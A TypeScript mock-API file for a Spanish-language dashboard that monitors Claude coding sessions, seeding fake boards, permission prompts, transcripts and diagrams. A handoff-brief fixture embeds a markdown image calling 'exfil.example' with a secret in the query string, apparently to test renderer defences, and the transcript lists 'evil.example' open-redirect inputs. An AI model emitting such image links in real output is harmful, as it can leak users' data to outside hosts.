import { setUploadSrc } from '../lib/attachments'
import { attachTerminales, mockAbrirVentana, mockAuditoria, mockCerrar, mockComando, mockCtrlC, mockPreview, mockRepetirConfirmar, mockRepetirPreparar, mockSalida, mockTerminalConfig, mockBorrarCopia, mockTerminalesCarpetas, mockTerminalesNueva, mockTerminalesNuevaTarea } from './mockTerminales'
import { createMockLimpieza } from './mockLimpieza'
import { mockClaudeUso } from './mockUsoClaude'
import { createMockMemoria } from './mockMemoria'
import { createMockNotas } from './mockNotas'
import { createMockLibrary, MOCK_LIB_IDS } from './mockLibrary'
import { DIAGRAMA_ARQ, DIAGRAMA_CHICO } from './diagramas'
import { DIAGRAMA_BIFE, DIAGRAMA_LARGO, DIAGRAMA_MENSAJE, DIAGRAMA_MENSAJE_LLANO } from './diagramasReales'
import { normalizeDialog } from '../lib/dialogo'
import {
  ApiError,
  type Agent,
  type AgentCtx,
  type AgentStatus,
  type Api,
  type Aviso,
  type Board,
  type ChatMessage,
  type ClosePane,
  type ClosePreview,
  type DecidirPermisoRequest,
  type Digest,
  type DiosTokens,
  type PedidoPermiso,
  type RegistroPermiso,
  type SessionEvent,
  type TranscriptItem,
  type DiosDia,
} from '../api/types'

let vozLoaded = false
const minsAgo = (m: number) => new Date(Date.now() - m * 60_000).toISOString()
const sleep = (ms: number, signal?: AbortSignal) =>
  new Promise<void>((res, rej) => {
    const t = setTimeout(res, ms)
    signal?.addEventListener('abort', () => {
      clearTimeout(t)
      rej(new DOMException('aborted', 'AbortError'))
    })
  })

const a = (pane: string, status: AgentStatus, title: string, doing: string, pending: string, mins: number, asks = false, unread = false): Agent => ({
  pane_id: pane,
  kind: 'claude',
  status,
  session_id: `mock-${pane.replace(':', '-')}`,
  title,
  doing,
  pending,
  asks_user: asks,
  unread,
  last_activity: minsAgo(mins),
  fondo: [],
})

const ctxOf = (pct: number, compactaciones = 0, minutos = 180): AgentCtx => ({
  pct,
  tokens: Math.round(pct * 10_000),
  window: 1_000_000,
  fuente: 'statusline',
  compactaciones,
  ultima_compactacion: compactaciones ? { ts: minsAgo(minutos), trigger: 'auto', pre: 229_000, post: 22_600 } : null,
})

const MOCK_CTX: Record<string, AgentCtx | null> = {
  'w1:p1': ctxOf(3),
  'wC:p1': ctxOf(18),
  'w5:pF': ctxOf(41),
  'w8:p1': null,
  'w8:p2': ctxOf(9, 1, 600),
  'wA:p1': ctxOf(27, 2, 180),
  'wP:p1': ctxOf(12),
  'wS:p1': ctxOf(34, 1, 90),
  'wF:p1': ctxOf(5),
  'wG:p1': ctxOf(19, 2, 45),
  'w9:p1': ctxOf(62),
}

const MOCK_MIN = 22

const MOCK_ESTADO: Record<string, Agent['estado']> = {
  'w1:p1': { hizo: 'Saqué el mapa de la sesión y reinicié Colmena', falta: 'Elegir el diseño de las tarjetas', pide: '¿Cuál de las tres opciones preferís?' },
  'w8:p2': { hizo: 'Arreglé el cálculo de envío en el carrito y pasaron los tests' },
}

const MOCK_DIALOGS: Record<string, unknown> = {
  bash: {
    tipo: 'permiso',
    huella: 'mock-bash',
    pane_id: 'w5:pF',
    permiso: { herramienta: 'Bash', detalle: 'docker compose -f demo-web/docker-compose.yml up -d --build && curl -s http://localhost:8082/health', descripcion: 'Levanta web en el puerto 8082 y verifica que responda', completo: true, opciones: ['si', 'si_siempre', 'si_auto', 'no'], regla: 'docker compose *', mas_en_terminal: false },
  },
  edit: {
    tipo: 'permiso',
    huella: 'mock-edit',
    pane_id: 'w5:pF',
    permiso: { herramienta: 'Edit', detalle: '- ports: ["8080:80"]\n+ ports: ["8082:80"]', descripcion: '', completo: true, opciones: ['si', 'si_ediciones', 'no'], regla: null, mas_en_terminal: false, archivo: '/home/usuario/proyectos/acme/deprecated/demo-web/docker-compose.yml', replace_all: false },
  },
  question: {
    tipo: 'pregunta',
    huella: 'mock-question',
    pane_id: 'w5:pF',
    pregunta: { preguntas: [{ header: 'Puerto', texto: '¿Paso el compose de web a 8082 o bajo api mientras tanto?', multi: false, otro: true, opciones: [{ label: 'Pasar web a 8082', descripcion: 'Cambia el mapeo de puertos y deja api como está.' }, { label: 'Bajar api', descripcion: 'Libera el 8080 pero corta la demo de api.' }, { label: 'Dejarlo así', descripcion: '' }] }] },
  },
  multi: {
    tipo: 'pregunta',
    huella: 'mock-multi',
    pane_id: 'w5:pF',
    pregunta: { preguntas: [{ header: 'Lenguajes', texto: '¿Qué lenguajes usás en el módulo?', multi: true, otro: false, opciones: [{ label: 'Python', descripcion: 'Backend y scripts' }, { label: 'PHP', descripcion: 'Web' }, { label: 'Go', descripcion: '' }] }] },
  },
  several: {
    tipo: 'pregunta',
    huella: 'mock-several',
    pane_id: 'w5:pF',
    pregunta: { preguntas: [
      { header: 'Editor', texto: '¿Con qué editor trabajás?', multi: false, otro: false, opciones: [{ label: 'Vim', descripcion: 'Modal' }, { label: 'VSCode', descripcion: 'Gráfico' }] },
      { header: 'Lenguajes', texto: '¿Qué lenguajes usás?', multi: true, otro: false, opciones: [{ label: 'Python', descripcion: '' }, { label: 'PHP', descripcion: '' }, { label: 'Go', descripcion: '' }] },
    ] },
  },
  unknown: { tipo: 'desconocido', pane_id: 'w5:pF', pantalla: '────────────────────────────────\n Claude quiere usar una herramienta nueva\n\n ❯ 1. Permitir una vez\n   2. Denegar\n' },
  pedido: {
    tipo: 'pedido',
    pedido: {
      id: 'mock-p1',
      session_id: 'mock-w5-pF',
      pane_id: 'w5:pF',
      herramienta: 'Bash',
      entrada: { command: 'docker compose up -d' },
      estado: 'abierto',
      regla: { herramienta: 'Bash', contenido: 'docker compose *', archivo: '/home/u/p/.claude/settings.local.json', huella: 'mock-h' },
    },
  },
}

const mockPedidos = new Map<string, PedidoPermiso>(
  Object.values(MOCK_DIALOGS)
    .map((d) => (d && typeof d === 'object' && (d as { tipo?: string }).tipo === 'pedido' ? ((d as { pedido: PedidoPermiso }).pedido) : null))
    .filter((p): p is PedidoPermiso => !!p)
    .map((p) => [p.id, { ...p }]),
)

const MD_LONG = '## Qué es\nEs una web que corre en la notebook y te muestra todas tus sesiones de Claude en un solo lugar. Al lado tiene un chat con un Claude que las conoce. Ese Claude no puede tocar nada por su cuenta.'
const MD_LIST = '**Resumen:** quedaron 3 cambios en `src/pagos/Infrastructure/Gateway/PasarelaGatewayClient.php`:\n- timeouts a 8 s\n- reintento con backoff\n- logs sin PAN'
const MD_CODE = 'Corrí `composer run tests` y falló 1:\n```\nFAILURES! Tests: 214, Assertions: 530, Failures: 1.\n```\nRevisar /home/usuario/proyectos/tienda-demo/modules/reservas/tests/Unit/ReservationExpiryTest.php'

function withCtx(board: Board): Board {
  for (const w of board.workspaces) for (const t of w.tabs) for (const x of t.agents) { x.ctx = MOCK_CTX[x.pane_id] ?? null; if (MOCK_ESTADO[x.pane_id]) x.estado = MOCK_ESTADO[x.pane_id] }
  return board
}

function seed(): Board {
  const ws = (id: string, number: number, label: string, status: AgentStatus, tabs: Board['workspaces'][number]['tabs']) => ({ id, number, label, status, tabs })
  return {
    updated_at: new Date().toISOString(),
    focused_tab_id: 'wF:t1',
    self_pane_id: null,
    workspaces: [
      {
        ...ws('w1', 1, 'Super orquestador', 'idle', [
          { id: 'w1:t1', label: '1', agents: [a('w1:p1', 'idle', 'Orquestador de sesiones web con chat integrado', '', MD_LONG, 2)] },
          { id: 'w1:t2', label: '2', agents: [] },
          { id: 'w1:t3', label: 'claude suelto', agents: [] },
        ]),
        pinned: true,
      },
      ws('wC', 2, 'Modulo carrito', 'working', [{ id: 'wC:t1', label: '1', agents: [a('wC:p1', 'working', 'Módulo de carrito en la tienda', '', 'Corriendo los tests de integración del hook de carrito; faltan 2 suites.', 1)] }]),
      ws('w5', 3, 'Levantado de entornos', 'blocked', [
        { id: 'w5:tF', label: 'Entornos', agents: [a('w5:pF', 'blocked', 'Entornos locales de la tienda y la API', '', 'El compose de web sigue mapeando 8080:80 y choca con api. ¿Lo paso a 8082 o bajo api mientras tanto?', 7, true)] },
        { id: 'w5:tH', label: '2', agents: [] },
      ]),
      ws('w8', 4, 'Investigacion UI', 'idle', [
        { id: 'w8:t1', label: 'Home', agents: [{ ...a('w8:p1', 'idle', 'Tab Personalización de la Home', '', 'Dejé el mapa de hooks de displayHome con los 4 módulos que lo pisan. ¿Cuál absorbe el carrusel?', 38, true), preguntas: 2 }] },
        { id: 'w8:t2', label: 'UI', agents: [a('w8:p2', 'done', 'Revisión de componentes UI', '', 'Listo: reporte de los 12 componentes con props faltantes, en plans/ui-gaps.md.', 64)] },
      ]),
      ws('wA', 5, 'Acmekit', 'idle', [{ id: 'wA:t1', label: '1', agents: [a('wA:p1', 'idle', 'Nueva ubicación de acmekit', '', 'Remote actualizado a innovacion/kit; quedó pendiente avisar al equipo por Slack.', 180)] }]),
      ws('wP', 6, 'API de pagos', 'idle', [{ id: 'wP:t1', label: '1', agents: [a('wP:p1', 'idle', 'Reintentos del cliente de pasarela', '', MD_LIST, 95, false, true)] }]),
      ws('wS', 7, 'Stock reservations', 'idle', [
        { id: 'wS:t1', label: 'tests', agents: [a('wS:p1', 'idle', 'Expiración de reservas bajo carga concurrente en reservas', '', MD_CODE, 130)] },
        { id: 'wS:t2', label: '2', agents: [] },
      ]),
      ws('wF', 8, 'Imagenes CDN', 'idle', [{ id: 'wF:t1', label: '1', agents: [a('wF:p1', 'idle', 'CloudFront para imágenes de la tienda', '', 'Tengo la distribución armada en el plan; falta confirmar si las imágenes de producto van por el mismo bucket que los assets del theme. ¿Te sirve que lo separe?', 12, true)] }]),
      ws('wG', 9, 'Login federado', 'idle', [{
        id: 'wG:t1',
        label: '1',
        agents: [{
          ...a('wG:p1', 'idle', 'Login federado en la tienda', '', 'El turno terminó; siguen corriendo tareas en segundo plano.', 2),
          fondo: [
            { id: 'mock-cursor', tipo: 'cursor', texto: 'tarjetas del tablero', desde: 1 },
            { id: 'mock-agente', tipo: 'agente', texto: 'auditoría de estilos', desde: 2 },
          ],
        }],
      }]),
      ws('w9', 10, 'Pruebas', 'done', [
        { id: 'w9:t1', label: 'Duet', agents: [a('w9:p1', 'done', 'Claude Duet en Acme', '', 'Terminé la comparación; el resumen quedó en el chat.', 240, false, true)] },
        { id: 'w9:t2', label: 'notas', agents: [] },
      ]),
    ],
    terminales: 'ok',
    conflictos: [],
    caidos: [],
  }
}

const ANSWER_ALT = (dest: string) => `Ok, lo cambio a ${dest}. Ajusto el brief para que no asuma el contexto del tab actual.

\`\`\`traspaso
{"origen": "Imagenes CDN (wF:p1)", "destino_tipo": "${dest.includes('workspace') ? 'workspace_nuevo' : dest.includes('existente') ? 'existente' : 'tab_nuevo'}", "destino": "${dest.includes('workspace') ? 'workspace nuevo: CloudFront Tienda' : 'Investigacion UI (w8:p1)'}", "por_que": "Pedido tuyo: queda aislado del resto.", "brief_path": "/home/usuario/.local/share/orquestador/handoffs/2026-10-30-cloudfront-imagenes.md", "resumen_brief": "Mismo brief, sin referencias al hilo original.", "pane_id": "w8:p1", "workspace_id": "wF", "label": "CloudFront Tienda", "cwd": "/home/usuario/proyectos/acme", "agent_name": "cloudfront-tienda"}
\`\`\``

const BRIEF = `# Brief: CloudFront para imágenes de la tienda

## Contexto
Distribución armada con dos orígenes (\`img/p/\` y \`themes/\`). Falta decidir si se separan buckets.

![diagrama de la distribución](https://exfil.example/x.png?d=secreto)

## Decisiones tomadas
- \`img/p/*\` con TTL de 30 días e invalidación por prefijo
- \`themes/*\` versionado por hash

## Pendiente / primer paso sugerido
Confirmar con el usuario si las imágenes de producto van por el mismo bucket que los assets del theme.`

const fence = (lang: string, v: unknown) => '```' + lang + '\n' + JSON.stringify(v) + '\n```'

const DIAGRAMA_SEQ = {
  titulo: 'Cómo la tienda consulta stock y precios',
  resumen: 'La tienda no habla directo con los servicios: pasa siempre por el módulo intermedio, que reintenta si el servicio A falla.',
  tipo: 'secuencia',
  actores: [
    { id: 'tienda', nombre: 'Tienda', icono: '🛒' },
    { id: 'mod', nombre: 'Módulo intermedio', icono: '🧩' },
    { id: 'sa', nombre: 'Servicio A', icono: '📦' },
    { id: 'sb', nombre: 'Servicio B', icono: '💲' },
  ],
  pasos: [
    { de: 'tienda', a: 'mod', texto: 'Pide stock y precio de un SKU', detalle: 'El hook de producto llama al módulo con el SKU de la ficha. La tienda nunca conoce las URLs de los servicios.', datos: '{ "sku": "ABC-123", "qty": 2 }', tipo: 'llamada' },
    { de: 'mod', a: 'sa', texto: 'Consulta stock', detalle: 'Usa el token del servicio A con timeout de 800 ms.', datos: 'GET /stock/ABC-123', tipo: 'llamada' },
    { de: 'sa', a: 'mod', texto: 'Falla: 503', detalle: 'El servicio A está saturado y devuelve un error temporal.', datos: '503 Service Unavailable', tipo: 'error' },
    { de: 'mod', texto: 'Espera y reintenta', detalle: 'Backoff de 300 ms, hasta 2 reintentos. Si fallan todos, devuelve el último stock cacheado.', tipo: 'evento' },
    { de: 'mod', a: 'sa', texto: 'Reintenta el stock', datos: 'GET /stock/ABC-123', tipo: 'llamada' },
    { de: 'sa', a: 'mod', texto: 'Devuelve el stock', datos: '{ "disponible": 14 }', tipo: 'respuesta' },
    { de: 'mod', a: 'sb', texto: 'Consulta el precio', detalle: 'El servicio B no depende del A, así que en producción esto corre en paralelo con el stock.', datos: 'GET /precio/ABC-123', tipo: 'llamada' },
    { de: 'sb', a: 'mod', texto: 'Devuelve el precio', datos: '{ "precio": 1890.5, "moneda": "ARS" }', tipo: 'respuesta' },
    { de: 'mod', a: 'tienda', texto: 'Responde con todo junto', detalle: 'Un solo payload normalizado; la tienda solo lo pinta.', datos: '{ "disponible": 14, "precio": 1890.5 }', tipo: 'respuesta' },
  ],
  notas: ['Los timeouts y reintentos viven solo en el módulo.', 'Si el servicio B cae, la ficha se muestra sin precio actualizado.'],
}

const DIAGRAMA_PROC = {
  titulo: 'Cómo cocinar un bife jugoso',
  resumen: 'Sellar fuerte, dar vuelta y llevar a punto, con un descanso al final que no se negocia.',
  tipo: 'proceso',
  pasos: [
    { id: 'p1', texto: 'Sacar la carne de la heladera', detalle: 'Que llegue a temperatura ambiente para que se cocine parejo.', duracion: '30 min', icono: '🥩' },
    { id: 'p2', texto: 'Salar y secar bien', detalle: 'Sal gruesa y papel de cocina: una carne seca sella, una mojada se hierve.', duracion: '2 min', icono: '🧂' },
    { id: 'p3', texto: 'Sellar en sartén bien caliente', detalle: 'Humo leve y aceite que casi brilla.', duracion: '3 min', icono: '🔥' },
    { id: 'p4', texto: 'Dar vuelta', icono: '🔄', duracion: '3 min', detalle: 'Una sola vez. No la pinches con el tenedor.' },
    { id: 'p5', texto: 'Revisar el punto', icono: '👆', decision: { pregunta: '¿Está dorada y firme al tacto?', si: 'p7', no: 'p6' } },
    { id: 'p6', texto: 'Dar 1 minuto más', icono: '⏱', duracion: '1 min', detalle: 'Baja un poco el fuego para no quemarla.' },
    { id: 'p7', texto: 'Dejar descansar', detalle: 'Tapada con papel aluminio: los jugos se reparten y no se pierden al cortar.', duracion: '5 min', icono: '😌' },
    { id: 'p8', texto: 'Cortar y servir', icono: '🍽' },
  ],
  notas: ['El tiempo depende del grosor: contá 3 min por lado para 2 cm.'],
}

const OPCIONES_A = { pregunta: '¿Qué hacemos con el sumario de la fila?', opciones: [{ label: 'Recortarlo', detalle: 'Solo lo último, más un botón para abrir el chat', recomendada: true }, { label: 'Sacarlo', detalle: 'La fila abre directo el chat' }, { label: 'Dejarlo como está' }] }
const OPCIONES_B = { pregunta: '¿Y el aviso al celular?', opciones: [{ label: 'Solo si termina', detalle: 'Una notificación por sesión que cierra', recomendada: true }, { label: 'En cada hito', detalle: 'Más ruido, pero no te perdés nada' }] }

const ANSWER_MULTI = `Para cerrar el rediseño de la fila necesito dos decisiones tuyas.\n\n${fence('opciones', OPCIONES_A)}\n\n${fence('opciones', OPCIONES_B)}\n\nRespondé las dos juntas con el botón.`
const ANSWER_DIAGRAMA_SEQ = `Te lo dibujé entero. Tocá cualquier paso para ver el detalle, o recorrelo de a uno.\n\n${fence('diagrama', DIAGRAMA_SEQ)}\n\nLo importante: la tienda solo conoce al módulo.`
const ANSWER_DIAGRAMA = `Así está armado, de punta a punta. Tocá cualquier cosa para ver para qué sirve.\n\n${fence('diagrama', DIAGRAMA_ARQ)}\n\nY la versión corta:\n\n${fence('diagrama', DIAGRAMA_CHICO)}`
const ANSWER_DIAGRAMA_PROC = `Va el paso a paso del bife.\n\n${fence('diagrama', DIAGRAMA_PROC)}`
const ANSWER_DIAGRAMAS_REALES = `Te dejo los tres juntos.\n\n${fence('diagrama', DIAGRAMA_MENSAJE_LLANO)}\n\nEl mismo, como estaba antes.\n\n${fence('diagrama', DIAGRAMA_MENSAJE)}\n\nY el del bife, con el control del punto.\n\n${fence('diagrama', DIAGRAMA_BIFE)}\n\nY uno largo, para ver cómo serpentea.\n\n${fence('diagrama', DIAGRAMA_LARGO)}`

const PRUEBAS_MOCK = { titulo: 'Login federado', resumen: 'Probado contra Keycloak local en el celu y en la compu.', casos: [{ nombre: 'Entra con usuario válido', resultado: 'ok' }, { nombre: 'Vuelve a la página de origen', resultado: 'ok', detalle: 'Mantiene la sesión al volver.' }, { nombre: 'Token vencido en el pago', resultado: 'falla', detalle: 'Muestra pantalla en blanco en lugar del aviso.', evidencia: '/home/usuario/capturas/pago-vencido.png' }, { nombre: 'Cierre de sesión global', resultado: 'omitida', detalle: 'Falta el entorno de pruebas.' }] }
const ANSWER_PRUEBAS = `Corrí las pruebas del login.\n\n${fence('pruebas', PRUEBAS_MOCK)}\n\nQuedó una falla para mirar.`

const DIGEST_TURNS = [
  { role: 'user' as const, text: 'armá la distribución de CloudFront para las imágenes de la tienda' },
  { role: 'claude' as const, text: 'Revisé el bucket actual: las imágenes de producto viven en `img/p/` y los assets del theme en `themes/`. Propongo una distribución con dos orígenes y behaviors por prefijo.\n\nRutas tocadas: `/home/usuario/proyectos/tienda-demo/infra/terraform/modules/cloudfront/distribution_images_and_theme_assets.tf` y `/home/usuario/proyectos/tienda-demo/infra/terraform/environments/uat/main.tf`.' },
  { role: 'user' as const, text: 'dale, y cuidá los headers de cache' },
  { role: 'claude' as const, text: '## Plan\nListo el plan en `plans/cloudfront-tienda.md`:\n\n- `img/p/*` → TTL 30 días, invalidación por prefijo\n- `themes/*` → versionado por hash\n- headers: `Cache-Control: public, max-age=2592000, immutable`\n\n```hcl\nordered_cache_behavior {\n  path_pattern     = "img/p/*"\n  target_origin_id = "s3-products-images-uat-us-east-1"\n  min_ttl          = 0\n  default_ttl      = 2592000\n}\n```\n\nFalta confirmar si separamos buckets.' },
  { role: 'user' as const, text: 'separalos, pero que el de theme siga versionado' },
  { role: 'claude' as const, text: 'Hecho. Dos buckets, `demo-tienda-img` y `demo-tienda-theme`, cada uno con su origen y su OAC. Corrí `terraform validate` y da verde; el `plan` muestra 6 recursos nuevos y 0 destruidos.\n\nQuedan dos decisiones tuyas:\n1. ¿Invalidación automática en cada deploy del theme?\n2. ¿Dominio propio `img.acme.com` o el de CloudFront?' },
]


const SHOT_ID = '20261031-101500-error-checkout.png'
const svgUrl = (a: string, b: string, label: string) =>
  `data:image/svg+xml,${encodeURIComponent(
    `<svg xmlns="http://www.w3.org/2000/svg" width="480" height="360"><defs><linearGradient id="g" x1="0" y1="0" x2="1" y2="1"><stop offset="0" stop-color="${a}"/><stop offset="1" stop-color="${b}"/></linearGradient></defs><rect width="480" height="360" fill="url(#g)"/><rect x="40" y="48" width="400" height="56" rx="10" fill="rgba(255,255,255,.18)"/><rect x="40" y="128" width="260" height="14" rx="7" fill="rgba(255,255,255,.35)"/><rect x="40" y="156" width="340" height="14" rx="7" fill="rgba(255,255,255,.25)"/><text x="40" y="300" font-family="monospace" font-size="22" fill="white">${label}</text></svg>`,
  )}`

const FLOW: Array<[string, Array<[string, string]>, string]> = [
  ['Revisá por qué falla el callback OIDC cuando viene return_to', [['Grep', 'return_to'], ['Read', '/home/usuario/proyectos/tienda-demo/modules/oidc/src/Controller/CallbackController.php'], ['Read', '/home/usuario/proyectos/tienda-demo/modules/oidc/src/Service/ReturnToResolver.php']], 'El callback descarta `return_to` cuando la sesión se regenera antes de leerlo. Lo guardo en el `state` firmado en lugar de la sesión.\n\n```php\n$state = $this->signer->sign([\'nonce\' => $nonce, \'return_to\' => $returnTo]);\n```'],
  ['Dale, y que valide que sea una ruta interna', [['Edit', '/home/usuario/proyectos/tienda-demo/modules/oidc/src/Service/ReturnToResolver.php'], ['Edit', '/home/usuario/proyectos/tienda-demo/modules/oidc/src/Controller/CallbackController.php'], ['Write', '/home/usuario/proyectos/tienda-demo/modules/oidc/tests/Unit/ReturnToResolverTest.php'], ['Bash', 'composer run tests -- --filter ReturnToResolverTest'], ['Bash', 'composer run cs-fix'], ['Read', '/home/usuario/proyectos/tienda-demo/modules/oidc/composer.json'], ['Grep', 'ReturnToResolver'], ['Bash', 'git diff --stat'], ['Edit', '/home/usuario/proyectos/tienda-demo/modules/oidc/README.md'], ['Bash', 'composer run tests'], ['Glob', 'modules/oidc/**/*.php'], ['Bash', 'git status --short']], '## Listo\nAhora `return_to` solo acepta rutas relativas de la tienda; cualquier otra cosa cae en `/`.\n\n- 9 casos nuevos de test (rutas absolutas, `//host`, esquemas raros)\n- suite del módulo en verde: **38 tests, 0 fallas**\n\n| Entrada | Resultado |\n|---|---|\n| `/mi-cuenta` | `/mi-cuenta` |\n| `//evil.example` | `/` |\n| `https://evil.example` | `/` |'],
  ['Mirá este error que me tira el checkout con el login federado', [['Read', '/home/usuario/Proyectos/orquestador/data/uploads/' + SHOT_ID]], 'Veo el error: el token expira mientras el cliente completa el pago. Es independiente del `return_to`; lo anoto como pendiente aparte.'],
  ['Probalo contra Keycloak local', [['Bash', 'docker compose -f docker/keycloak/compose.yml up -d'], ['Bash', 'curl -s localhost:8081/realms/acme/.well-known/openid-configuration'], ['Bash', 'php bin/console oidc:smoke --realm=acme']], 'Funciona contra Keycloak local: login, redirect y vuelta a `/mi-cuenta` con la sesión intacta.\n\n¿Querés que lo suba ya al MR o prefieres revisarlo primero?'],
]

const transcripts = new Map<string, TranscriptItem[]>()

function transcriptFor(sid: string): TranscriptItem[] {
  const hit = transcripts.get(sid)
  if (hit) return hit
  const out: TranscriptItem[] = []
  let t = Date.now() - 160 * 60_000
  const tick = () => new Date((t += 70_000)).toISOString()
  for (let round = 0; round < 6; round++) {
    if (round === 5) out.push({ kind: 'compact', text: 'Resumen de la conversación hasta acá.\n\n- Se arregló `return_to` en el callback OIDC guardándolo en el `state` firmado.\n- Quedan pendientes los tests contra Keycloak local.', name: '', summary: '', ts: tick(), compact: { trigger: 'auto', pre: 228_986, post: 22_618 } })
    for (const [ask, tools, answer] of FLOW) {
      let text = ask
      if (ask.startsWith('Mirá este error')) text = `${ask} (Adjunto: /home/usuario/Proyectos/orquestador/data/uploads/${SHOT_ID})`
      out.push({ kind: 'user', text, name: '', summary: '', ts: tick() })
      for (const [name, summary] of tools) out.push({ kind: 'tool', text: '', name, summary, ts: tick() })
      out.push({ kind: 'claude', text: answer, name: '', summary: '', ts: tick() })
    }
  }
  out.push({ kind: 'claude', text: 'Antes de seguir necesito que elijas cómo lo encaro.\n\n```opciones\n{\"pregunta\": \"¿Qué hacemos con el sumario de la fila?\", \"opciones\": [{\"label\": \"Recortarlo\", \"detalle\": \"Solo lo último, más un botón para abrir el chat\", \"recomendada\": true}, {\"label\": \"Sacarlo\", \"detalle\": \"La fila abre directo el chat\"}, {\"label\": \"Dejarlo como está\"}]}\n```\n\nSi ninguna te cierra, decime y lo pensamos de nuevo.', name: '', summary: '', ts: tick() })
  out.push({ kind: 'user', text: 'explicame cómo Tienda se comunica con los servicios', name: '', summary: '', ts: tick() })
  out.push({ kind: 'tool', text: '', name: 'Artifact', summary: 'tablero-reservas.html', ts: tick(), lib_ids: [MOCK_LIB_IDS.html, MOCK_LIB_IDS.image] })
  out.push({ kind: 'imagenes', text: '', name: '', summary: '', ts: tick(), fotos: [{ id: MOCK_LIB_IDS.captura1 }] })
  out.push({ kind: 'claude', text: ANSWER_DIAGRAMA_SEQ, name: '', summary: '', ts: tick(), lib_ids: [MOCK_LIB_IDS.secuencia] })
  out.push({ kind: 'user', text: 'y cómo cocino un bife?', name: '', summary: '', ts: tick() })
  out.push({ kind: 'claude', text: ANSWER_DIAGRAMA_PROC, name: '', summary: '', ts: tick() })
  out.push({ kind: 'claude', text: ANSWER_MULTI, name: '', summary: '', ts: tick() })
  out.push({ kind: 'claude', text: ANSWER_PRUEBAS, name: '', summary: '', ts: tick() })
  out.push({ kind: 'claude', text: ANSWER_DIAGRAMAS_REALES, name: '', summary: '', ts: tick(), lib_ids: [MOCK_LIB_IDS.mensaje, MOCK_LIB_IDS.bife, MOCK_LIB_IDS.llano] })
  out.push({ kind: 'user', text: 'mostrame un diagrama de cómo se conecta todo', name: '', summary: '', ts: tick() })
  out.push({
    kind: 'imagenes',
    text: '',
    name: '',
    summary: '',
    ts: tick(),
    fotos: [
      MOCK_LIB_IDS.captura1,
      MOCK_LIB_IDS.captura2,
      MOCK_LIB_IDS.captura3,
      MOCK_LIB_IDS.captura4,
      MOCK_LIB_IDS.captura5,
      MOCK_LIB_IDS.captura6,
      MOCK_LIB_IDS.captura7,
    ].map((id) => ({ id })),
  })
  out.push({ kind: 'claude', text: ANSWER_DIAGRAMA, name: '', summary: '', ts: tick(), lib_ids: [MOCK_LIB_IDS.diagramaArq, MOCK_LIB_IDS.diagramaChico] })
  transcripts.set(sid, out)
  return out
}

const slug = (name: string) => name.toLowerCase().replace(/\.[^.]+$/, '').replace(/[^a-z0-9]+/g, '-').replace(/^-|-$/g, '').slice(0, 40) || 'archivo'
const dataUrls = new Map<string, string>()

const mockStart = Date.now()

/** Avisos de ejemplo que suman las piezas montadas. */
export const avisosMockExtra: Aviso[] = []

function mockAvisos(): Aviso[] {
  const now = Math.floor(Date.now() / 1000)
  const hoyAt = (h: number, m: number) => {
    const d = new Date()
    d.setHours(h, m, 0, 0)
    return Math.min(now - 60, Math.floor(d.getTime() / 1000))
  }
  const ayerAt = (h: number, m: number) => hoyAt(h, m) - 86400
  const mk = (id: number, ts: number, kind: Aviso['kind'], titulo: string, cuerpo: string, extra: Partial<Aviso> = {}): Aviso => ({
    id, ts, kind, titulo, cuerpo, session_id: '', pane_id: '', fecha: '', mr: '', tag: '', entregado: true, leido: false, motivo: '', ...extra,
  })
  return [
    mk(1, ayerAt(10, 12), 'done', 'Acme terminó', 'Revisá la sesión en Colmena.', { session_id: 'mock-wG-p1' }),
    mk(3, ayerAt(18, 5), 'terminal', 'Se escribió en una terminal', 'Revisá la actividad de terminales.', { pane_id: 'wS:t2' }),
    mk(4, hoyAt(9, 30), 'asks', 'Acme te pregunta', '¿Aplico la migración en la base local o armo un script aparte?', { session_id: 'mock-wG-p1' }),
    mk(5, hoyAt(11, 2), 'blocked', 'Acme espera una aprobación', 'Quiere ejecutar un comando fuera del proyecto.', { session_id: 'mock-wG-p1' }),
    mk(6, hoyAt(12, 45), 'test', 'Colmena', 'Las notificaciones funcionan.', { entregado: false }),
    mk(7, hoyAt(13, 10), 'done', 'Orquestador terminó', 'Revisá la sesión en Colmena.', { session_id: 'mock-wG-p1', entregado: false }),
    mk(8, hoyAt(13, 40), 'mr', 'Falló el pipeline', 'tienda !412: feat: checkout con cuotas sin interés', { mr: '101:412' }),
    ...avisosMockExtra,
  ].sort((a, b) => a.id - b.id)
}

export function createMockApi(onUnauthorized: () => void): Api {
  let board = withCtx(seed())
  attachTerminales(board)
  const library = createMockLibrary()
  let fails = 0
  let logged = new URLSearchParams(location.search).get('mock') !== 'login'
  const history: ChatMessage[] = []
  const sentIds = new Set<string>()
  let onSession: ((e: SessionEvent) => void) | undefined
  let emitBoard: ((b: Board) => void) | undefined
  const held = new Map<string, string[]>()
  const closed = new Map<string, { ok: boolean; sesiones: { session_id: string | null; cwd: string; titulo: string }[]; event: ChatMessage | null }>()

  const closePreview = (tipo: 'tab' | 'workspace', targetId: string): ClosePreview => {
    const w = tipo === 'workspace' ? board.workspaces.find((x) => x.id === targetId) : board.workspaces.find((x) => x.tabs.some((t) => t.id === targetId))
    const tabs = tipo === 'workspace' ? w?.tabs : w?.tabs.filter((t) => t.id === targetId)
    if (!w || !tabs?.length) throw new ApiError(404, 'Ya no existe')
    if (w.pinned) {
      if (tipo === 'workspace' || w.tabs.length < 2) throw new ApiError(400, 'Ese workspace está protegido')
      if (tabs[0].agents.length || tabs[0].terminales?.some((t) => t.proceso === 'claude'))
        throw new ApiError(403, 'Ese tab del workspace protegido tiene una sesión de Claude')
    }
    const panes = tabs.flatMap((t): ClosePane[] =>
      t.agents.length
        ? t.agents.map((x) => ({ pane_id: x.pane_id, kind: x.kind, status: x.status, titulo: x.title, session_id: x.session_id, cwd: '/home/usuario/proyectos/tienda-demo', proceso: null }))
        : t.terminales?.length
          ? t.terminales.map((x) => ({ pane_id: x.pane_id, kind: null, status: null, titulo: x.titulo, session_id: null, cwd: x.cwd, proceso: x.estado === 'prompt' ? null : x.proceso }))
          : [{ pane_id: `${t.id}:term`, kind: null, status: null, titulo: '', session_id: null, cwd: '/home/usuario/proyectos/tienda-demo', proceso: t.id === 'wS:t2' ? 'node' : 'bash' }],
    )
    const bloqueantes = panes.filter((x) => x.status && x.status !== 'idle' && x.status !== 'done').map((x) => ({ pane_id: x.pane_id, status: x.status! }))
    const label = tipo === 'workspace' ? w.label : tabs[0].label
    return {
      tipo,
      target_id: targetId,
      label,
      workspace_label: w.label,
      cierra_workspace: tipo === 'tab' && w.tabs.length === 1,
      tab_count: tipo === 'tab' ? 1 : w.tabs.length,
      panes,
      bloqueantes,
      huella: `mock-${tipo}-${targetId}-${panes.map((x) => `${x.pane_id}:${x.status}`).join(',')}`,
